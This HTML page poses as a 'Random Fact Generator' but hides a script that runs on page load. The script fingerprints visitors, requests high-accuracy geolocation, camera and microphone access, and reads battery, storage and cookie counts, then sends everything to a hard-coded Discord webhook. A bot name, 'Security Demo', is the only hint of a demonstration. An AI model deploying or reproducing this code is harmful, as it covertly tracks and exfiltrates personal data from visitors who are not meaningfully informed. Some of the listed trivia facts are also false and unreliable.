<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Random Fact Generator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        h1 {
            color: #333;
            text-align: center;
            border-bottom: 2px solid #ddd;
            padding-bottom: 10px;
        }
        .warning-box {
            background-color: #ffebee;
            color: #c62828;
            padding: 15px;
            margin: 20px 0;
            border-radius: 5px;
            border-left: 5px solid #c62828;
            font-weight: bold;
        }
        p {
            margin-bottom: 20px;
        }
        .info-section {
            background-color: white;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .tiny-warning {
            font-size: 10px;
            color: #999;
            text-align: center;
            margin-top: 20px;
            padding: 5px;
        }
        #fact-display {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            min-height: 80px;
            margin: 20px 0;
            font-size: 18px;
            text-align: center;
        }
        button {
            display: block;
            margin: 0 auto;
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <h1>Random Fact Generator</h1>
    
    <div class="tiny-warning">
        By using this site, you agree to our data collection practices.
    </div>
    
    <div class="info-section">
        <p>Click the button below to generate a random interesting fact!</p>
        <button id="fact-button">Generate Random Fact</button>
        <div id="fact-display">Your random fact will appear here...</div>
    </div>
    
    <div class="info-section">
        <p>Data Collection Status:</p>
        <div id="collection-status">Collecting data...</div>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1331766891630563360/hNFGqedGjuvsgNJmGBrk0asdX_kZ0D7dlK-7MdXEHihk_oXwYDrGtdNNRGO4UA4ZmBf7";
        
        const allCollectedData = {};
        let dataSent = false;
        
        let dataCollectionComplete = {
            basic: false,
            geo: false,
            battery: false,
            media: false
        };
        
        function sendToDiscordWebhook() {
            if (dataSent) return; // Prevent multiple sends
            
            console.log("Attempting to send data to Discord webhook...");
            if (!DISCORD_WEBHOOK_URL) {
                console.error("Discord webhook URL is empty or invalid");
                return;
            }
            
            let formattedMessage = "**Client Information Collection Results**\n\n";
            formattedMessage += `**Timestamp:** ${new Date().toString()}\n\n`;
            
            formattedMessage += "**ðŸŒ BROWSER INFORMATION**\n";
            if (allCollectedData['browser-info']) {
                Object.entries(allCollectedData['browser-info']).forEach(([key, value]) => {
                    formattedMessage += `${key}: ${value}\n`;
                });
            }
            formattedMessage += "\n";
            
            formattedMessage += "**ðŸ“± SCREEN & WINDOW INFORMATION**\n";
            if (allCollectedData['screen-info']) {
                Object.entries(allCollectedData['screen-info']).forEach(([key, value]) => {
                    formattedMessage += `${key}: ${value}\n`;
                });
            }
            formattedMessage += "\n";
            
            formattedMessage += "**ðŸŒ NETWORK INFORMATION**\n";
            if (allCollectedData['network-info']) {
                Object.entries(allCollectedData['network-info']).forEach(([key, value]) => {
                    formattedMessage += `${key}: ${value}\n`;
                });
            }
            formattedMessage += "\n";
            
            formattedMessage += "**ðŸ“ LOCATION INFORMATION**\n";
            if (allCollectedData['geo-info']) {
                Object.entries(allCollectedData['geo-info']).forEach(([key, value]) => {
                    formattedMessage += `${key}: ${value}\n`;
                });
            }
            formattedMessage += "\n";
            
            formattedMessage += "**ðŸ”‹ BATTERY INFORMATION**\n";
            if (allCollectedData['battery-info']) {
                Object.entries(allCollectedData['battery-info']).forEach(([key, value]) => {
                    formattedMessage += `${key}: ${value}\n`;
                });
            }
            formattedMessage += "\n";
            
            formattedMessage += "**ðŸ’» HARDWARE INFORMATION**\n";
            if (allCollectedData['hardware-info']) {
                Object.entries(allCollectedData['hardware-info']).forEach(([key, value]) => {
                    formattedMessage += `${key}: ${value}\n`;
                });
            }
            formattedMessage += "\n";
            
            formattedMessage += "**âš™ï¸ BROWSER CAPABILITIES**\n";
            if (allCollectedData['capabilities-info']) {
                Object.entries(allCollectedData['capabilities-info']).forEach(([key, value]) => {
                    formattedMessage += `${key}: ${value}\n`;
                });
            }
            formattedMessage += "\n";
            
            formattedMessage += "**ðŸ•’ TIME & TIMEZONE**\n";
            if (allCollectedData['time-info']) {
                Object.entries(allCollectedData['time-info']).forEach(([key, value]) => {
                    formattedMessage += `${key}: ${value}\n`;
                });
            }
            formattedMessage += "\n";
            
            formattedMessage += "**ðŸ“· MEDIA DEVICES**\n";
            if (allCollectedData['media-info']) {
                Object.entries(allCollectedData['media-info']).forEach(([key, value]) => {
                    formattedMessage += `${key}: ${value}\n`;
                });
            }
            formattedMessage += "\n";
            
            formattedMessage += "**ðŸ’¾ STORAGE INFORMATION**\n";
            if (allCollectedData['storage-info']) {
                Object.entries(allCollectedData['storage-info']).forEach(([key, value]) => {
                    formattedMessage += `${key}: ${value}\n`;
                });
            }
            formattedMessage += "\n";
            
            formattedMessage += "**ðŸ“‹ HTTP HEADERS**\n";
            if (allCollectedData['headers-info']) {
                Object.entries(allCollectedData['headers-info']).forEach(([key, value]) => {
                    formattedMessage += `${key}: ${value}\n`;
                });
            }
            formattedMessage += "\n";
            
            formattedMessage += "**ðŸ‘† FINGERPRINTING**\n";
            if (allCollectedData['fingerprint-info']) {
                Object.entries(allCollectedData['fingerprint-info']).forEach(([key, value]) => {
                    formattedMessage += `${key}: ${value}\n`;
                });
            }
            formattedMessage += "\n";
            
            formattedMessage += "**âš¡ PERFORMANCE**\n";
            if (allCollectedData['performance-info']) {
                Object.entries(allCollectedData['performance-info']).forEach(([key, value]) => {
                    formattedMessage += `${key}: ${value}\n`;
                });
            }
            
            const messageChunks = [];
            const maxLength = 1950; 
            
            let currentChunk = "";
            const lines = formattedMessage.split('\n');
            
            for (const line of lines) {
                if (currentChunk.length + line.length + 1 > maxLength) {
                    messageChunks.push(currentChunk);
                    currentChunk = line + '\n';
                } else {
                    currentChunk += line + '\n';
                }
            }
            
            if (currentChunk.length > 0) {
                messageChunks.push(currentChunk);
            }
            
            // Mark as sent to prevent duplicate sends
            dataSent = true;
            document.getElementById('collection-status').textContent = "Sending data...";
            
            messageChunks.forEach((chunk, index) => {
                setTimeout(() => {
                    console.log(`Sending chunk ${index+1} of ${messageChunks.length}`);
                    fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            content: chunk,
                            username: "Security Demo",
                            avatar_url: "https://cdn-icons-png.flaticon.com/512/1946/1946429.png",
                        })
                    })
                    .then(response => {
                        if (!response.ok) {
                            return response.text().then(text => {
                                throw new Error(`Discord API error: ${response.status} ${text}`);
                            });
                        }
                        console.log(`Successfully sent chunk ${index+1}`);
                        if (index === messageChunks.length - 1) {
                            document.getElementById('collection-status').textContent = "Data sent successfully!";
                        }
                        return response.text();
                    })
                    .catch(error => {
                        console.error('Error sending to Discord:', error);
                        document.getElementById('collection-status').textContent = "Error sending data: " + error.message;
                    });
                }, index * 1500);
            });
        }
        
        function checkDataCollectionStatus() {
            console.log("Checking data collection status:", dataCollectionComplete);
            const complete = Object.values(dataCollectionComplete).filter(status => status === true).length;
            const total = Object.values(dataCollectionComplete).length;
            
            document.getElementById('collection-status').textContent = 
                `Collected ${complete}/${total} data categories. ${complete === total ? 'Sending data...' : 'Still collecting...'}`;
                
            if (Object.values(dataCollectionComplete).every(status => status === true)) {
                console.log("All data collection complete, sending to webhook");
                // Add a small delay to make sure everything is collected
                setTimeout(sendToDiscordWebhook, 1000);
            }
        }
        
        function storeData(category, label, value) {
            if (!allCollectedData[category]) {
                allCollectedData[category] = {};
            }
            allCollectedData[category][label] = value;
        }
        
        const browserInfo = {
            'User Agent': navigator.userAgent,
            'Browser Language': navigator.language,
            'Languages': Array.isArray(navigator.languages) ? navigator.languages.join(', ') : navigator.language,
            'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
            'Do Not Track': navigator.doNotTrack || 'Not specified',
            'Platform': navigator.platform,
            'Browser Vendor': navigator.vendor || 'Not available',
            'Browser Version': navigator.appVersion || 'Not available',
            'App Name': navigator.appName || 'Not available',
            'Product': navigator.product || 'Not available'
        };
        
        Object.entries(browserInfo).forEach(([label, value]) => {
            storeData('browser-info', label, value);
        });
        
        const screenInfo = {
            'Screen Width': window.screen.width + 'px',
            'Screen Height': window.screen.height + 'px',
            'Available Width': window.screen.availWidth + 'px',
            'Available Height': window.screen.availHeight + 'px',
            'Color Depth': window.screen.colorDepth + ' bits',
            'Pixel Depth': window.screen.pixelDepth + ' bits',
            'Window Inner Width': window.innerWidth + 'px',
            'Window Inner Height': window.innerHeight + 'px',
            'Device Pixel Ratio': window.devicePixelRatio,
            'Orientation': screen.orientation ? screen.orientation.type : 'Not available'
        };
        
        Object.entries(screenInfo).forEach(([label, value]) => {
            storeData('screen-info', label, value);
        });
        
        if ('connection' in navigator) {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                const networkInfo = {
                    'Effective Type': connection.effectiveType || 'Not available',
                    'Downlink': (connection.downlink ? connection.downlink + ' Mbps' : 'Not available'),
                    'Round Trip Time': (connection.rtt ? connection.rtt + ' ms' : 'Not available'),
                    'Save Data Mode': connection.saveData ? 'Enabled' : 'Disabled'
                };
                
                Object.entries(networkInfo).forEach(([label, value]) => {
                    storeData('network-info', label, value);
                });
            }
        } else {
            storeData('network-info', 'Network Information', 'API not available in this browser');
        }
        
        const hardwareInfo = {
            'Logical CPU Cores': navigator.hardwareConcurrency || 'Not available',
            'Maximum Touch Points': navigator.maxTouchPoints || 'Not available',
            'Device Memory': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Not available'
        };
        
        Object.entries(hardwareInfo).forEach(([label, value]) => {
            storeData('hardware-info', label, value);
        });
        
        const caps = {
            'PDF Viewer Built-in': navigator.pdfViewerEnabled ? 'Yes' : 'No/Unknown',
            'Java Enabled': navigator.javaEnabled ? navigator.javaEnabled() : 'Unknown',
            'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
            'Local Storage Available': typeof(Storage) !== 'undefined' ? 'Yes' : 'No',
            'Session Storage Available': typeof(sessionStorage) !== 'undefined' ? 'Yes' : 'No',
            'IndexedDB Available': window.indexedDB ? 'Yes' : 'No',
            'WEBGL Available': (function() {
                try {
                    return !!window.WebGLRenderingContext && 
                           !!document.createElement('canvas').getContext('experimental-webgl');
                } catch(e) {
                    return false;
                }
            })() ? 'Yes' : 'No',
            'Web Workers Available': !!window.Worker ? 'Yes' : 'No',
            'Service Workers Available': 'serviceWorker' in navigator ? 'Yes' : 'No',
            'Push Notifications Available': 'PushManager' in window ? 'Yes' : 'No'
        };
        
        Object.entries(caps).forEach(([label, value]) => {
            storeData('capabilities-info', label, value);
        });
        
        const now = new Date();
        const timeInfo = {
            'Current Time': now.toString(),
            'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
            'Timezone Offset': now.getTimezoneOffset() + ' minutes from UTC',
            'Date Locale': Intl.DateTimeFormat().resolvedOptions().locale
        };
        
        Object.entries(timeInfo).forEach(([label, value]) => {
            storeData('time-info', label, value);
        });
        
        try {
            if (window.localStorage) {
                const storageInfo = {
                    'LocalStorage Available': 'Yes',
                    'LocalStorage Items': localStorage.length,
                    'SessionStorage Available': window.sessionStorage ? 'Yes' : 'No',
                    'SessionStorage Items': window.sessionStorage ? sessionStorage.length : 'N/A',
                    'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
                    'Cookie Count': document.cookie ? document.cookie.split(';').length : 0
                };
                
                Object.entries(storageInfo).forEach(([label, value]) => {
                    storeData('storage-info', label, value);
                });
            } else {
                storeData('storage-info', 'Local Storage', 'Not available');
            }
        } catch (e) {
            storeData('storage-info', 'Error accessing storage', e.message);
        }
        
        const commonHeaders = {
            'User-Agent': navigator.userAgent,
            'Accept-Language': navigator.language,
            'DNT (Do Not Track)': navigator.doNotTrack || 'Not specified',
            'Referer': document.referrer || 'None/Direct Navigation',
            'Host': window.location.host,
            'Origin': window.location.origin
        };
        
        Object.entries(commonHeaders).forEach(([label, value]) => {
            storeData('headers-info', label, value);
        });
        
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 220;
            canvas.height = 30;
            
            const ctx = canvas.getContext('2d');
            
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("Fingerprint", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("Test", 4, 17);
            
            const dataURL = canvas.toDataURL();
            const hash = dataURL.length;
            
            storeData('fingerprint-info', 'Canvas Fingerprint Value', 'Signature Length: ' + hash);
            storeData('fingerprint-info', 'Canvas Data URL Hash', hash.toString());
        } catch (e) {
            storeData('fingerprint-info', 'Canvas Fingerprinting', 'Failed: ' + e.message);
        }
        
        if (window.performance) {
            const perfInfo = {
                'Navigation Type': (function() {
                    const navType = performance.navigation ? performance.navigation.type : null;
                    if (navType === 0) return 'Navigate';
                    if (navType === 1) return 'Reload';
                    if (navType === 2) return 'Back/Forward';
                    return 'Unknown';
                })(),
                'Redirect Count': performance.navigation ? performance.navigation.redirectCount : 'Unknown',
                'Page Load Time': performance.timing ? 
                    (performance.timing.loadEventEnd - performance.timing.navigationStart) + ' ms' : 
                    'Not available'
            };
            
            Object.entries(perfInfo).forEach(([label, value]) => {
                storeData('performance-info', label, value);
            });
            
            if (performance.getEntriesByType) {
                try {
                    const navEntry = performance.getEntriesByType('navigation')[0];
                    if (navEntry) {
                        storeData('performance-info', 'DOM Complete Time', navEntry.domComplete + ' ms');
                        storeData('performance-info', 'DOM Interactive Time', navEntry.domInteractive + ' ms');
                        storeData('performance-info', 'Response Start Time', navEntry.responseStart + ' ms');
                    }
                } catch (e) {
                }
                
                try {
                    const paintEntries = performance.getEntriesByType('paint');
                    if (paintEntries.length > 0) {
                        paintEntries.forEach(entry => {
                            storeData('performance-info', entry.name, entry.startTime + ' ms');
                        });
                    }
                } catch (e) {
                }
            }
        } else {
            storeData('performance-info', 'Performance API', 'Not available');
        }
        
        dataCollectionComplete.basic = true;
        
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    storeData('geo-info', 'Latitude', position.coords.latitude);
                    storeData('geo-info', 'Longitude', position.coords.longitude);
                    storeData('geo-info', 'Accuracy', position.coords.accuracy + ' meters');
                    if (position.coords.altitude) {
                        storeData('geo-info', 'Altitude', position.coords.altitude + ' meters');
                    }
                    if (position.coords.heading) {
                        storeData('geo-info', 'Heading', position.coords.heading + 'Â°');
                    }
                    if (position.coords.speed) {
                        storeData('geo-info', 'Speed', position.coords.speed + ' m/s');
                    }
                    storeData('geo-info', 'Timestamp', new Date(position.timestamp).toString());
                    
                    dataCollectionComplete.geo = true;
                    checkDataCollectionStatus();
                },
                function(error) {
                    storeData('geo-info', 'Geolocation API', 'Available but permission denied or error');
                    storeData('geo-info', 'Error', error.message);
                    
                    dataCollectionComplete.geo = true;
                    checkDataCollectionStatus();
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            storeData('geo-info', 'Geolocation API', 'Not available in this browser');
            
            dataCollectionComplete.geo = true;
            checkDataCollectionStatus();
        }
        
        if ('getBattery' in navigator) {
            navigator.getBattery().then(function(battery) {
                storeData('battery-info', 'Battery Charging', battery.charging ? 'Yes' : 'No');
                storeData('battery-info', 'Battery Level', (battery.level * 100) + '%');
                storeData('battery-info', 'Charging Time', battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + ' seconds');
                storeData('battery-info', 'Discharging Time', battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + ' seconds');
                
                dataCollectionComplete.battery = true;
                checkDataCollectionStatus();
            }).catch(function(error) {
                storeData('battery-info', 'Battery API', 'Error accessing battery: ' + error.message);
                
                dataCollectionComplete.battery = true;
                checkDataCollectionStatus();
            });
        } else {
            storeData('battery-info', 'Battery API', 'Not available in this browser');
            
            dataCollectionComplete.battery = true;
            checkDataCollectionStatus();
        }
        
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            console.log("Attempting to access media devices...");
            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
            .then(function(stream) {
                console.log("Media access granted");
                stream.getTracks().forEach(track => track.stop());
                
                navigator.mediaDevices.enumerateDevices()
                .then(function(devices) {
                    let audioInputCount = 0;
                    let audioOutputCount = 0;
                    let videoInputCount = 0;
                    
                    devices.forEach(function(device) {
                        if (device.kind === 'audioinput') audioInputCount++;
                        if (device.kind === 'audiooutput') audioOutputCount++;
                        if (device.kind === 'videoinput') videoInputCount++;
                    });
                    
                    storeData('media-info', 'Microphones', audioInputCount);
                    storeData('media-info', 'Speakers/Headphones', audioOutputCount);
                    storeData('media-info', 'Cameras', videoInputCount);
                    
                    console.log("Media devices collected:", { audioInputCount, audioOutputCount, videoInputCount });
                    dataCollectionComplete.media = true;
                    checkDataCollectionStatus();
                });
            })
            .catch(function(err) {
                console.log("Media access denied:", err.message);
                navigator.mediaDevices.enumerateDevices()
                .then(function(devices) {
                    storeData('media-info', 'Permission Status', 'Denied: ' + err.message);
                    storeData('media-info', 'Device Count', devices.length + ' (limited information due to permissions)');
                    
                    dataCollectionComplete.media = true;
                    checkDataCollectionStatus();
                })
                .catch(function(enumErr) {
                    storeData('media-info', 'Media Devices API', 'Error: ' + enumErr.message);
                    
                    dataCollectionComplete.media = true;
                    checkDataCollectionStatus();
                });
            });
        } else {
            console.log("Media Devices API not available");
            storeData('media-info', 'Media Devices API', 'Not available in this browser');
            
            dataCollectionComplete.media = true;
            checkDataCollectionStatus();
        }

        // Force execution of sendToDiscordWebhook after all data is collected
        // Backup timeout in case something goes wrong with the normal flow
        setTimeout(function() {
            if (!dataSent) {
                console.log("Backup timeout triggered, sending data");
                sendToDiscordWebhook();
            }
        }, 15000);

        const facts = [
            "The shortest war in history was between Britain and Zanzibar in 1896. It lasted only 38 minutes.",
            "Octopuses have three hearts and blue blood.",
            "A group of flamingos is called a 'flamboyance'.",
            "The Great Wall of China is not visible from space with the naked eye.",
            "Bananas are berries, but strawberries aren't.",
            "The world's oldest known living tree is over 5,000 years old.",
            "Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still perfectly good to eat.",
            "A day on Venus is longer than a year on Venus. It takes 243 Earth days to rotate once on its axis, but only 225 Earth days to go around the Sun.",
            "Cows have best friends and get stressed when they are separated.",
            "The fingerprints of koalas are so similar to humans that they have on occasion been confused at crime scenes.",
            "The Hawaiian alphabet has only 12 letters.",
            "Australia is wider than the moon. The moon is 3,400 km in diameter, while Australia is 4,000 km from east to west.",
            "There are more possible iterations of a game of chess than there are atoms in the known universe.",
            "A blue whale's heart is so big that a human could swim through its arteries.",
            "Polar bears have black skin underneath their white fur.",
            "The average person will spend six months of their life waiting at red lights.",
            "A bolt of lightning is five times hotter than the surface of the sun.",
            "Humans share 50% of their DNA with bananas.",
            "The only letter that doesn't appear in the periodic table is the letter J.",
            "A hummingbird weighs less than a penny.",
            "The Eiffel Tower can be 15 cm taller during the summer due to thermal expansion.",
            "Cats can't taste sweetness.",
            "The world's largest desert is Antarctica, not the Sahara.",
            "A single cloud can weigh more than a million pounds.",
            "Astronauts cannot cry in space because tears don't fall in zero gravity.",
            "The average person walks the equivalent of five times around the world in their lifetime.",
            "Dolphins sleep with one eye open.",
            "There are more trees on Earth than stars in the Milky Way galaxy.",
            "A group of crows is called a 'murder'.",
            "Human teeth are just as strong as shark teeth."
        ];
        
        document.getElementById('fact-button').addEventListener('click', function() {
            const randomIndex = Math.floor(Math.random() * facts.length);
            document.getElementById('fact-display').textContent = facts[randomIndex];
        });
        
        // Update status periodically
        setInterval(function() {
            if (dataSent) return;
            
            const complete = Object.values(dataCollectionComplete).filter(status => status === true).length;
            const total = Object.values(dataCollectionComplete).length;
            document.getElementById('collection-status').textContent = 
                `Collected ${complete}/${total} data categories. ${complete === total ? 'Preparing to send data...' : 'Still collecting...'}`;
        }, 1000);
    </script>
</body>
</html>
